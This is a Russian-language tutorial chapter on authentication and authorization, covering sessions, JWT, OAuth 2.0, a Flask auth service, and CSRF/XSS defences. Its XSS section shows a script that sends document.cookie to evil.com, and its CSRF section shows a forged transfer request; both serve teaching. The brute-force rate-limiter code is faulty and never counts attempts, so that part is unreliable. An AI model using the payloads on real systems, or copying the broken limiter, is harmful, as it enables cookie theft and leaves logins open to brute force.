# Система аутентификации и авторизации
> 💡 **Учебное руководство**: эта глава поможет вам глубоко понять «систему контроля доступа» бэкенд-системы — аутентификацию и авторизацию. Мы начнём с самого базового «кто ты» и шаг за шагом освоим Session, JWT, OAuth 2.0 и другие современные схемы аутентификации.

<AuthEvolutionDemo />

## 0. Введение: «контроль доступа» системы

Почему после входа в WeChat вы остаётесь в системе, даже если закрыть и снова открыть приложение?
Почему, заходя на Bilibili, сервис знает, что вы — VIP-участник или обычный пользователь?
Почему при входе на сторонний сайт по QR-коду WeChat вам не нужно вводить пароль?

За всем этим стоит ключевая система: **аутентификация и авторизация (Authentication & Authorization)**.

Если сравнить бэкенд-систему со зданием:

- **Аутентификация (Authentication)**: подтверждает, «кто ты» (проверка паспорта/пропуска).
- **Авторизация (Authorization)**: подтверждает, «куда ты можешь пойти» (VIP может войти в VIP-зону, обычный пользователь — нет).

### 0.1 Зачем нужна аутентификация?

Причина одна: **защита ресурсов**.

- **Защита приватности**: вашу личную информацию и переписку можете видеть только вы.
- **Контроль прав доступа**: администратор может удалять пользователей, обычный пользователь — нет.
- **Предотвращение злоупотреблений**: защита от злонамеренных вызовов и накрутки запросов к API.

<AuthBasicsDemo />

### 0.2 Интерактивная демонстрация: процесс входа

Давайте на примере реальной демонстрации входа разберёмся, как работают аутентификация и авторизация.

<AuthInteractiveLoginDemo />

**Ключевой момент**: аутентификация — это первая линия обороны, все чувствительные операции должны сначала проверять личность.

---

## 1. Базовые понятия: аутентификация vs авторизация

### 1.1 Аутентификация (Authentication): кто ты?

Подтверждение личности пользователя.

- _Пример_: ввод имени пользователя и пароля, отпечаток пальца, распознавание лица.
- _Результат_: токен (Token), представляющий «тебя».
- _Сокращение_: **AuthN**

### 1.2 Авторизация (Authorization): что ты можешь делать?

Подтверждение того, какими правами обладает пользователь.

- _Пример_: администратор может удалять статьи, обычный пользователь — только ставить лайки.
- _Результат_: разрешение или отказ в доступе.
- _Сокращение_: **AuthZ**

### 1.3 Связь между ними

```
Запрос пользователя → Аутентификация (кто ты?) → Авторизация (можешь ли ты?) → Выполнение бизнес-логики
           ↓                        ↓
      Проверка личности       Проверка прав
      (Token валиден?)        (есть право delete?)
```

<AuthNvsAuthZDemo />

**Ключевой момент**: сначала аутентификация, потом авторизация. Только подтвердив, «кто ты», можно судить о том, «что ты можешь делать».

---

## 2. История эволюции схем

### 2.1 Первое поколение: HTTP Basic Authentication

Самая древняя схема — имя пользователя и пароль помещаются прямо в HTTP-заголовок.

```http
GET /api/user/profile HTTP/1.1
Host: example.com
Authorization: Basic dXNlcm5hbWU6cGFzc3dvcmQ=
                      (base64("username:password"))
```

- **Плюсы**: просто, поддерживается всеми браузерами.
- **Минусы**:
  - Небезопасно (Base64 декодируется, фактически открытый текст).
  - Пароль передаётся при каждом запросе (легко перехватить).
  - Невозможно активно выйти из системы (кроме как закрыв браузер).

**Вывод**: подходит только для внутренних тестовых инструментов, ни в коем случае не для продакшена.

### 2.2 Второе поколение: Session + Cookie

Классическая схема веб-разработки.

**Процесс**:

```
1. Пользователь входит (POST /login)
   → Сервер проверяет имя пользователя и пароль
   → Создаёт Session (в памяти сервера или в Redis)
   → Возвращает Set-Cookie: session_id=abc123

2. Последующие запросы
   → Браузер автоматически добавляет Cookie: session_id=abc123
   → Сервер по session_id находит Session
   → Если нашёл — считает, что «ты это ты»
```

**Пример кода**:

```python
# Бэкенд (Python Flask)
from flask import session, request

@app.route("/login", methods=["POST"])
def login():
    username = request.json["username"]
    password = request.json["password"]

    # Проверяем имя пользователя и пароль
    user = db.authenticate(username, password)
    if user:
        # Создаём Session
        session["user_id"] = user.id
        session["role"] = user.role
        return {"status": "success"}
    else:
        return {"error": "Неверное имя пользователя или пароль"}, 401

@app.route("/api/admin/users")
def get_users():
    # Проверяем Session
    if "user_id" not in session:
        return {"error": "Не выполнен вход"}, 401

    # Проверяем права
    if session.get("role") != "admin":
        return {"error": "Недостаточно прав"}, 403

    # Выполняем бизнес-логику
    users = db.get_all_users()
    return {"users": users}
```

<SessionCookieDemo />

**Плюсы**:

- Просто и наглядно, легко понять.
- Серверная сторона может активно завершить сессию (удалить Session).

**Минусы**:

- **Сервер с состоянием**: нужно хранить Session, при нескольких серверах требуется общее хранилище (например, Redis).
- **Сложности с междоменностью**: Cookie по умолчанию не работает между доменами (проблема CORS).
- **CSRF-атаки**: вредоносный сайт может воспользоваться вашим Cookie.

**Вывод**: подходит для традиционных веб-приложений (серверный рендеринг), не подходит для мобильных устройств и современных SPA.

### 2.3 Третье поколение: Token (JWT)

Основная схема современного веба.

**Ключевая идея**: не хранить состояние на сервере, а зашифровать информацию о пользователе в Token и хранить его на стороне клиента.

**Структура JWT**:

```
JWT = Header.Payload.Signature

Пример:
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoxMjMsInJvbGUiOiJhZG1pbiIsImV4cCI6MTYxNjIzOTAyMn0.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c
 |--------------------------------| |-----------------------------------------------| |----------------------------|
           Header                           Payload                                      Signature
```

- **Header**: информация об алгоритме (например, `{"alg": "HS256", "typ": "JWT"}`).
- **Payload**: информация о пользователе (например, `{"user_id": 123, "role": "admin", "exp": 1616239022}`).
- **Signature**: подпись (защита от подделки).

**Процесс**:

```python
# 1. Пользователь входит
@app.route("/login", methods=["POST"])
def login():
    username = request.json["username"]
    password = request.json["password"]

    user = db.authenticate(username, password)
    if user:
        # Генерируем JWT
        token = jwt.encode(
            {
                "user_id": user.id,
                "role": user.role,
                "exp": datetime.now() + timedelta(hours=24)  # Истекает через 24 часа
            },
            SECRET_KEY,
            algorithm="HS256"
        )
        return {"token": token}
    else:
        return {"error": "Неверное имя пользователя или пароль"}, 401

# 2. Последующие запросы
@app.route("/api/admin/users")
def get_users():
    # Получаем Token из Header
    auth_header = request.headers.get("Authorization")
    if not auth_header or not auth_header.startswith("Bearer "):
        return {"error": "Token не предоставлен"}, 401

    token = auth_header.split(" ")[1]

    try:
        # Проверяем и разбираем Token
        payload = jwt.decode(token, SECRET_KEY, algorithms=["HS256"])
    except jwt.ExpiredSignatureError:
        return {"error": "Срок действия Token истёк"}, 401
    except jwt.InvalidTokenError:
        return {"error": "Token недействителен"}, 401

    # Проверяем права
    if payload.get("role") != "admin":
        return {"error": "Недостаточно прав"}, 403

    # Выполняем бизнес-логику
    users = db.get_all_users()
    return {"users": users}
```

<JWTWorkflowDemo />

**Плюсы**:

- **Без состояния**: сервер не хранит Session, легко масштабировать горизонтально.
- **Дружелюбен к междоменности**: помещается в Header, не ограничен правилами Cookie для разных доменов.
- **Дружелюбен к мобильным устройствам**: нативное приложение тоже легко использует.
- **Богат информацией**: в Payload можно хранить данные пользователя, права и т. д.

**Минусы**:

- **Невозможно активно завершить**: однажды выданный Token действителен до истечения срока (если не использовать чёрный список).
- **Payload видим**: кодирование Base64, нельзя хранить чувствительную информацию (например, пароли).
- **Token велик**: его нужно передавать с каждым запросом, несколько сотен байт.

**Вывод**: стандартная схема для современного веба и мобильных устройств.

<SessionVsJWTDemo />

---

## 3. OAuth 2.0: вход через третью сторону

Вы наверняка видели такие кнопки: «Войти через WeChat», «Войти через Google».

Это и есть **OAuth 2.0**: фреймворк **авторизации** (а не аутентификации!).

### 3.1 Ключевые роли

| Роль                     | Пояснение               | Пример               |
| :----------------------- | :----------------- | :----------------- |
| **Resource Owner**       | Владелец ресурса (пользователь) | Вы                 |
| **Client**               | Стороннее приложение         | Некий сайт           |
| **Authorization Server** | Сервер авторизации         | WeChat, Google       |
| **Resource Server**      | Сервер ресурсов         | API информации о пользователе WeChat |

### 3.2 Режим кода авторизации (Authorization Code Flow)

Самый безопасный режим, подходит для серверов с бэкендом.

**Процесс**:

```
1. Пользователь нажимает «Войти через WeChat»
   → Перенаправление на страницу авторизации WeChat
   https://open.weixin.qq.com/connect/qrconnect?
     appid=APPID&
     redirect_uri=https://yourapp.com/callback&
     response_type=code&
     scope=snsapi_login&
     state=STATE

2. Пользователь сканирует QR-код и соглашается на авторизацию
   → WeChat перенаправляет обратно на ваш сайт
   https://yourapp.com/callback?code=AUTHORIZATION_CODE&state=STATE

3. Ваш бэкенд обменивает code на access_token
   POST https://api.weixin.qq.com/sns/oauth2/access_token
   {
     "appid": "APPID",
     "secret": "SECRET",
     "code": "AUTHORIZATION_CODE",
     "grant_type": "authorization_code"
   }
   → Возвращает: { "access_token": "...", "openid": "..." }

4. С помощью access_token получаем информацию о пользователе
   GET https://api.weixin.qq.com/sns/userinfo?
     access_token=ACCESS_TOKEN&
     openid=OPENID
   → Возвращает: { "nickname": "Чжан Сань", "headimgurl": "..." }
```

<OAuth2FlowDemo />

**Пример кода**:

```python
from flask import request, redirect

@app.route("/login/wechat")
def login_wechat():
    # 1. Перенаправление на страницу авторизации WeChat
    auth_url = (
        "https://open.weixin.qq.com/connect/qrconnect"
        f"?appid={APPID}"
        f"&redirect_uri={urlencode(REDIRECT_URI)}"
        "&response_type=code"
        "&scope=snsapi_login"
        f"&state={generate_state()}"
    )
    return redirect(auth_url)

@app.route("/callback")
def wechat_callback():
    # 2. Получаем code
    code = request.args.get("code")
    state = request.args.get("state")

    # Проверяем state (защита от CSRF)
    if not verify_state(state):
        return {"error": "Invalid state"}, 400

    # 3. Обмениваем code на access_token
    token_resp = requests.post(
        "https://api.weixin.qq.com/sns/oauth2/access_token",
        params={
            "appid": APPID,
            "secret": SECRET,
            "code": code,
            "grant_type": "authorization_code"
        }
    ).json()

    access_token = token_resp["access_token"]
    openid = token_resp["openid"]

    # 4. Получаем информацию о пользователе
    user_info = requests.get(
        "https://api.weixin.qq.com/sns/userinfo",
        params={
            "access_token": access_token,
            "openid": openid
        }
    ).json()

    # 5. Локально создаём или обновляем пользователя
    user = db.get_or_create_user(
        openid=openid,
        nickname=user_info["nickname"],
        avatar=user_info["headimgurl"]
    )

    # 6. Генерируем JWT нашей системы
    token = jwt.encode(
        {"user_id": user.id, "exp": ...},
        SECRET_KEY
    )

    return {"token": token}
```

**Ключевые моменты**:

- **code используется только один раз**: после использования сразу становится недействительным, защита от перехвата.
- **state защищает от CSRF**: генерируется случайная строка, проверяется при обратном вызове, защищает от подделки вредоносным сайтом.
- **redirect_uri должен совпадать**: заранее регистрируется на открытой платформе WeChat, защита от атак с перенаправлением.

### 3.3 Другие режимы

| Режим                                | Сценарий применения                     | Безопасность           |
| :---------------------------------- | :--------------------------- | :--------------- |
| **Режим кода авторизации**          | Сервер с бэкендом               | ⭐⭐⭐⭐⭐       |
| **Упрощённый режим (Implicit)**     | Чисто фронтенд-приложения (SPA)            | ⭐⭐⭐ (не рекомендуется) |
| **Режим пароля (Resource Owner)**   | Высокодоверенные приложения (например, официальное App) | ⭐⭐             |
| **Клиентский режим (Client Credentials)** | Связь между серверами (без пользователя)       | ⭐⭐⭐⭐         |

<OAuth2ModesDemo />

---

## 4. Практика: проектируем полноценную систему аутентификации

### 4.1 Анализ требований

- **Поддержка нескольких платформ**: Web, iOS, Android.
- **Вход через третью сторону**: WeChat, Google.
- **Контроль прав доступа**: обычный пользователь, VIP, администратор.
- **Безопасность**: защита от накрутки, перехвата, повторного воспроизведения.

### 4.2 Проектирование архитектуры

```
┌─────────────┐
│   Клиент     │
└──────┬──────┘
       │
       ▼
┌─────────────────────────────────┐
│         API Gateway             │
│  - Rate Limiting (ограничение)   │
│  - Token Validation (проверка)   │
└──────┬──────────────────────────┘
       │
       ▼
┌─────────────────────────────────┐
│      Auth Service (сервис аутентификации) │
│  - Регистрация, вход              │
│  - Выдача и проверка Token        │
│  - Интеграция OAuth 2.0           │
└──────┬──────────────────────────┘
       │
       ▼
┌─────────────────────────────────┐
│    Business Services             │
│  - User Service                  │
│  - Order Service                 │
│  - Payment Service               │
└─────────────────────────────────┘
```

### 4.3 Проектирование базы данных

```sql
-- Таблица пользователей
CREATE TABLE users (
    id BIGINT PRIMARY KEY AUTO_INCREMENT,
    username VARCHAR(50) UNIQUE NOT NULL,
    password_hash VARCHAR(255) NOT NULL,  -- хеш bcrypt
    email VARCHAR(100) UNIQUE,
    role ENUM('user', 'vip', 'admin') DEFAULT 'user',
    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
    updated_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP,
    INDEX idx_username (username),
    INDEX idx_email (email)
);

-- Таблица привязок входа через третью сторону
CREATE TABLE user_auth_providers (
    id BIGINT PRIMARY KEY AUTO_INCREMENT,
    user_id BIGINT NOT NULL,
    provider ENUM('wechat', 'google', 'github') NOT NULL,
    provider_user_id VARCHAR(100) NOT NULL,  -- ID пользователя у третьей стороны
    access_token TEXT,  -- хранится в зашифрованном виде
    refresh_token TEXT,
    expires_at TIMESTAMP,
    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
    UNIQUE KEY uk_provider_provider_user_id (provider, provider_user_id),
    FOREIGN KEY (user_id) REFERENCES users(id) ON DELETE CASCADE
);

-- Чёрный список Token (для активного выхода)
CREATE TABLE token_blacklist (
    id BIGINT PRIMARY KEY AUTO_INCREMENT,
    token_jti VARCHAR(100) UNIQUE NOT NULL,  -- JTI у JWT (уникальный идентификатор)
    expired_at TIMESTAMP NOT NULL,
    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
    INDEX idx_expired_at (expired_at)
);
```

<AuthDatabaseDemo />

### 4.4 Реализация кода

```python
# auth_service.py
import bcrypt
import jwt
from datetime import datetime, timedelta

SECRET_KEY = "your-secret-key-here"  # В продакшене используйте переменные окружения

class AuthService:
    def register(self, username: str, password: str, email: str = None):
        # 1. Проверяем, существует ли имя пользователя
        if db.get_user_by_username(username):
            raise ValueError("Имя пользователя уже существует")

        # 2. Хешируем пароль (bcrypt)
        password_hash = bcrypt.hashpw(
            password.encode('utf-8'),
            bcrypt.gensalt(rounds=12)
        ).decode('utf-8')

        # 3. Создаём пользователя
        user = db.create_user(
            username=username,
            password_hash=password_hash,
            email=email
        )

        # 4. Выдаём Token
        return self._generate_tokens(user)

    def login(self, username: str, password: str):
        # 1. Запрашиваем пользователя
        user = db.get_user_by_username(username)
        if not user:
            raise ValueError("Неверное имя пользователя или пароль")

        # 2. Проверяем пароль
        if not bcrypt.checkpw(
            password.encode('utf-8'),
            user.password_hash.encode('utf-8')
        ):
            raise ValueError("Неверное имя пользователя или пароль")

        # 3. Выдаём Token
        return self._generate_tokens(user)

    def _generate_tokens(self, user):
        now = datetime.now()

        # Access Token (краткосрочный, например 1 час)
        access_token = jwt.encode(
            {
                "user_id": user.id,
                "role": user.role,
                "type": "access",
                "iat": now,
                "exp": now + timedelta(hours=1),
                "jti": str(uuid4())  # уникальный идентификатор
            },
            SECRET_KEY,
            algorithm="HS256"
        )

        # Refresh Token (долгосрочный, например 30 дней)
        refresh_token = jwt.encode(
            {
                "user_id": user.id,
                "type": "refresh",
                "iat": now,
                "exp": now + timedelta(days=30),
                "jti": str(uuid4())
            },
            SECRET_KEY,
            algorithm="HS256"
        )

        return {
            "access_token": access_token,
            "refresh_token": refresh_token,
            "token_type": "Bearer",
            "expires_in": 3600  # время истечения access_token (в секундах)
        }

    def refresh(self, refresh_token: str):
        try:
            payload = jwt.decode(refresh_token, SECRET_KEY, algorithms=["HS256"])
            if payload.get("type") != "refresh":
                raise ValueError("Invalid token type")

            user = db.get_user_by_id(payload["user_id"])
            return self._generate_tokens(user)
        except jwt.ExpiredSignatureError:
            raise ValueError("Срок действия Refresh token истёк")
        except jwt.InvalidTokenError:
            raise ValueError("Refresh token недействителен")

    def logout(self, token: str):
        # Добавляем Token в чёрный список
        payload = jwt.decode(token, SECRET_KEY, algorithms=["HS256"])
        db.add_to_blacklist(
            jti=payload["jti"],
            expired_at=datetime.fromtimestamp(payload["exp"])
        )

    def verify_token(self, token: str):
        try:
            payload = jwt.decode(token, SECRET_KEY, algorithms=["HS256"])

            # Проверяем, не в чёрном ли списке
            if db.is_token_blacklisted(payload["jti"]):
                raise ValueError("Token уже отозван")

            return payload
        except jwt.ExpiredSignatureError:
            raise ValueError("Срок действия Token истёк")
        except jwt.InvalidTokenError:
            raise ValueError("Token недействителен")

# Декоратор API
def require_auth(auth_service: AuthService):
    def decorator(f):
        def wrapper(*args, **kwargs):
            # Получаем Token из Header
            auth_header = request.headers.get("Authorization")
            if not auth_header or not auth_header.startswith("Bearer "):
                return {"error": "Token не предоставлен"}, 401

            token = auth_header.split(" ")[1]

            try:
                # Проверяем Token
                payload = auth_service.verify_token(token)
                # Внедряем информацию о пользователе в контекст запроса
                request.user = payload
                return f(*args, **kwargs)
            except ValueError as e:
                return {"error": str(e)}, 401

        return wrapper
    return decorator

def require_role(*roles):
    def decorator(f):
        def wrapper(*args, **kwargs):
            if not hasattr(request, "user"):
                return {"error": "Не выполнен вход"}, 401

            if request.user["role"] not in roles:
                return {"error": "Недостаточно прав"}, 403

            return f(*args, **kwargs)
        return wrapper
    return decorator

# Пример использования
@app.route("/api/admin/users", methods=["GET"])
@require_auth(auth_service)
@require_role("admin")
def get_users():
    users = db.get_all_users()
    return {"users": users}

@app.route("/api/user/profile", methods=["GET"])
@require_auth(auth_service)
def get_profile():
    user = db.get_user_by_id(request.user["user_id"])
    return {"user": user}

@app.route("/auth/refresh", methods=["POST"])
def refresh_token():
    refresh_token = request.json.get("refresh_token")
    try:
        tokens = auth_service.refresh(refresh_token)
        return tokens
    except ValueError as e:
        return {"error": str(e)}, 401
```

<CompleteAuthSystemDemo />

---

## 5. Лучшие практики безопасности

### 5.1 Хранение паролей

**❌ Неправильный подход**:

```python
# Хранение в открытом виде (абсолютно недопустимо!)
db.save_password(username, password)

# Хеш MD5 / SHA1 (недостаточно безопасно, легко взламывается радужными таблицами)
hash = md5(password)
db.save_password(username, hash)
```

**✅ Правильный подход**:

```python
# bcrypt (адаптивный хеш, медленный хеш защищает от перебора)
import bcrypt

password_hash = bcrypt.hashpw(
    password.encode('utf-8'),
    bcrypt.gensalt(rounds=12)  # чем больше rounds, тем безопаснее, но и медленнее
)

# Проверка
if bcrypt.checkpw(password.encode('utf-8'), password_hash):
    # Пароль верный
```

**Почему bcrypt?**

- **Медленный**: специально спроектирован медленным (миллисекунды), защита от перебора.
- **Адаптивный**: можно регулировать rounds, усиливая по мере роста мощности железа.
- **С солью**: содержит встроенную случайную соль, защита от радужных таблиц.

<PasswordHashingDemo />

### 5.2 Защита от перебора

- **Ограничение частоты**: один IP / имя пользователя может пробовать только 5 раз в минуту.
- **Капча**: после 3 неудач требовать ввод капчи.
- **Блокировка аккаунта**: после 10 неудач блокировать аккаунт на 30 минут.

```python
from functools import lru_cache
import time

@lru_cache(maxsize=10000)
def get_login_attempts(identifier: str) -> tuple:
    """Возвращает (число попыток, время первой попытки)"""
    return (0, 0)

def check_rate_limit(identifier: str):
    attempts, first_attempt = get_login_attempts(identifier)
    now = time.time()

    # Сброс в течение 1 минуты
    if now - first_attempt > 60:
        get_login_attempts.cache_clear()
        return True

    # Более 5 раз — отказ
    if attempts >= 5:
        return False

    return True

def record_login_attempt(identifier: str):
    attempts, first_attempt = get_login_attempts(identifier)
    if attempts == 0:
        first_attempt = time.time()
    get_login_attempts.cache_clear()
    get_login_attempts(identifier)  # повторно кэшируем

@app.route("/login", methods=["POST"])
def login():
    username = request.json["username"]

    # Проверяем ограничение частоты
    if not check_rate_limit(username):
        return {"error": "Слишком много попыток, повторите через 1 минуту"}, 429

    password = request.json["password"]

    # Проверяем пароль
    user = db.get_user_by_username(username)
    if user and bcrypt.checkpw(password.encode(), user.password_hash.encode()):
        # Успешный вход, обнуляем счётчик
        get_login_attempts.cache_clear()
        return {"token": generate_token(user)}
    else:
        # Неудачный вход, записываем
        record_login_attempt(username)
        return {"error": "Неверное имя пользователя или пароль"}, 401
```

### 5.3 Защита от CSRF (Cross-Site Request Forgery)

**Сценарий атаки**:
Вы вошли на сайт банка `bank.com`, а затем зашли на вредоносный сайт `evil.com`. На странице `evil.com` есть фрагмент кода:

```html
<img src="https://bank.com/api/transfer?to=attacker&amount=10000" />
```

Ваш браузер добавит к этому запросу Cookie банка (междоменный запрос), что приведёт к переводу средств.

**Меры защиты**:

1.  **CSRF Token**:
    - Сервер генерирует случайный Token и помещает его в форму.
    - При отправке проверяется совпадение Token.

```python
from flask import session

@app.route("/api/transfer", methods=["POST"])
def transfer():
    # Проверяем CSRF Token
    token = request.headers.get("X-CSRF-Token")
    if token != session.get("csrf_token"):
        return {"error": "CSRF Token недействителен"}, 403

    # Выполняем перевод
    ...
```

2.  **SameSite Cookie**:
    - Установить атрибут `SameSite` у Cookie в `Strict` или `Lax`.

```python
# Пример Flask
app.config.update(
    SESSION_COOKIE_SAMESITE='Lax',  # или 'Strict'
    SESSION_COOKIE_SECURE=True      # только HTTPS
)
```

3.  **Использование JWT (без Cookie)**:
    - JWT хранится в `localStorage`, не добавляется автоматически, что естественно защищает от CSRF.

<CSRFDefenseDemo />

### 5.4 Защита от XSS (Cross-Site Scripting)

**Сценарий атаки**:
Вредоносный пользователь вводит в разделе комментариев:

```html
<script>
  fetch('https://evil.com/steal?cookie=' + document.cookie)
</script>
```

Если сайт напрямую отрендерит этот контент, Cookie других пользователей будут украдены.

**Меры защиты**:

1.  **Экранирование вывода**:
    - Превратить `<` в `&lt;`, `>` в `&gt;`.

```python
import html

def render_comment(comment):
    # Экранируем HTML
    safe_comment = html.escape(comment)
    return f"<div class='comment'>{safe_comment}</div>"
```

2.  **Content Security Policy (CSP)**:
    - Установить HTTP-заголовок, ограничивающий источники скриптов.

```http
Content-Security-Policy: default-src 'self'; script-src 'self' https://cdn.example.com
```

3.  **HttpOnly Cookie**:
    - Установить атрибут `HttpOnly` у Cookie, чтобы JavaScript не мог его прочитать.

```python
app.config.update(
    SESSION_COOKIE_HTTPONLY=True
)
```

<XSSDefenseDemo />

---

## 6. Заключение и учебный маршрут

Аутентификация — это «базовый навык» бэкенд-системы; освоив его, можно строить безопасные и надёжные приложения.

### 6.1 Ключевые знания

| Знание                | Важность   | Сложность | Частота на практике |
| :-------------------- | :--------- | :--- | :------- |
| **Session + Cookie**  | ⭐⭐⭐⭐   | Средняя   | Высокая       |
| **JWT**               | ⭐⭐⭐⭐⭐ | Низкая   | Очень высокая     |
| **OAuth 2.0**         | ⭐⭐⭐⭐   | Высокая   | Высокая       |
| **Хеширование паролей (bcrypt)** | ⭐⭐⭐⭐⭐ | Низкая   | Очень высокая     |
| **Ограничение частоты и защита от перебора**  | ⭐⭐⭐⭐⭐ | Средняя   | Очень высокая     |
| **Защита от CSRF**         | ⭐⭐⭐⭐   | Средняя   | Средняя       |
| **Защита от XSS**          | ⭐⭐⭐⭐   | Низкая   | Высокая       |

### 6.2 Учебный маршрут

1.  **Начальный уровень** (1-2 дня):
    - Понять аутентификацию vs авторизацию.
    - Освоить принцип Session + Cookie.
    - Реализовать простую функцию входа и регистрации.

2.  **Продвинутый уровень** (1 неделя):
    - Изучить принцип и реализацию JWT.
    - Реализовать систему аутентификации на основе JWT.
    - Освоить хеширование паролей (bcrypt).

3.  **Практика** (2-4 недели):
    - Интегрировать OAuth 2.0 (вход через WeChat, Google).
    - Реализовать ограничение частоты, защиту от перебора.
    - Защититься от CSRF, XSS и других распространённых атак.

4.  **Углубление** (постоянно):
    - Изучить RBAC (управление доступом на основе ролей).
    - Исследовать SSO (единый вход).
    - Освоить Zero Trust Architecture (архитектуру нулевого доверия).

### 6.3 Рекомендуемые ресурсы

- **Стандарты**:
  - RFC 6749 (OAuth 2.0)
  - RFC 7519 (JWT)
- **Статьи**:
  - JWT.io: https://jwt.io/
  - OAuth 2.0 на упрощённом китайском: https://oauth.net/2/
- **Инструменты**:
  - jwt.io (онлайн-отладка JWT)
  - Postman (тестирование API)

---

## 7. Шпаргалка по терминам (Glossary)

| Термин              | Полное название                        | Объяснение                                                                               |
| :---------------- | :-------------------------- | :--------------------------------------------------------------------------------- |
| **AuthN**         | Authentication              | **Аутентификация**. Подтверждает, «кто ты» (например, ввод пароля для проверки личности).                                     |
| **AuthZ**         | Authorization               | **Авторизация**. Подтверждает, «что ты можешь делать» (например, удалять может только администратор).                                   |
| **Session**       | -                           | **Сессия**. Информация о состоянии пользователя, хранящаяся на сервере.                                               |
| **Cookie**        | -                           | **Печенька**. Небольшой фрагмент данных, хранящийся в браузере и автоматически добавляемый к каждому запросу.                           |
| **JWT**           | JSON Web Token              | **Веб-токен JSON**. Схема аутентификации без состояния, включающая три части: Header, Payload, Signature.  |
| **OAuth 2.0**     | -                           | **Открытая авторизация**. Стандартизированный фреймворк входа через третью сторону (например, «Войти через WeChat»).                           |
| **SSO**           | Single Sign-On              | **Единый вход**. Войдя один раз, можно получить доступ к нескольким приложениям (например, аккаунт Google для всех сервисов Google). |
| **RBAC**          | Role-Based Access Control   | **Управление доступом на основе ролей**. Права определяются на основе роли пользователя (например, admin, user).                 |
| **CSRF**          | Cross-Site Request Forgery  | **Межсайтовая подделка запроса**. Злоумышленник вынуждает пользователя отправить вредоносный запрос (например, перевод средств с вашим Cookie).         |
| **XSS**           | Cross-Site Scripting        | **Межсайтовый скриптинг**. Злоумышленник внедряет вредоносный скрипт в веб-страницу (например, для кражи Cookie).                      |
| **bcrypt**        | -                           | **Алгоритм хеширования паролей**. Медленный алгоритм хеширования, специально предназначенный для хранения паролей, защита от перебора.                   |
| **Access Token**  | -                           | **Токен доступа**. Краткосрочный токен для доступа к API.                                       |
| **Refresh Token** | -                           | **Токен обновления**. Долгосрочный токен для получения нового Access Token.                          |
| **Scope**         | -                           | **Область прав**. Понятие в OAuth 2.0, обозначающее права, запрашиваемые сторонним приложением (например, чтение информации о пользователе).     |
| **PKCE**          | Proof Key for Code Exchange | **Доказательный ключ для обмена кода авторизации**. Расширение OAuth 2.0 для усиления безопасности публичных клиентов (например, SPA).   |
